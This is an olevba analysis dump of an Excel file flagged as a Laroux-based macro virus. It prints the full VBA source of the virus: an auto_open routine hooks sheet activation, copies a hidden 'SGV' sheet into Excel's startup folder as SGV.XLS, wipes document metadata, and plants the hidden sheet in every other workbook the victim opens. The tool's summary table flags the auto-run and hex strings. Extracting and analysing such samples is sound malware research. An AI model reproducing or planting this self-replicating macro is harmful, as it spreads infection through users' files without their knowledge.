olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-c09e945f6c1d4461a44ce7f93e51dfa57449ca56
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux-based-c09e945f6c1d4461a44ce7f93e51dfa57449ca56 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Feuil1.cls 
in file: Virus.MSExcel.Laroux-based-c09e945f6c1d4461a44ce7f93e51dfa57449ca56 - OLE stream: '_VBA_PROJECT_CUR/VBA/Feuil1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_SelectionChange(ByVal Target As Excel.Range)

End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Laroux-based-c09e945f6c1d4461a44ce7f93e51dfa57449ca56 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "SGV.XLS")
    If m$ = "SGV.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("SGV").Visible = True
    Sheets("SGV").Select
    Sheets("SGV").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "SGV.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("SGV").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "SGV.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "SGV" Then
        Workbooks("SGV.XLS").Sheets("SGV").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("SGV").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "SGV.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Feuil
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

